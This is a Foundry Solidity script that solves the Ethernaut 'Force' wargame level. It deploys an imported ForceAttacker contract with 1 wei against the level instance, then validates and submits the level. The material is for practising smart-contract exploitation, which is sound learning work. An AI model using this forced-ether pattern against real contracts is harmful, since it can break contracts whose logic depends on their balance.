// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Force.sol";
import "./ForceAttacker.sol";

contract ForceSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Force instance = Force(getLevelInstance(Levels.force));

        new ForceAttacker{ value: 1 }(address(instance));

        require(validateLevelInstance(Levels.force, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
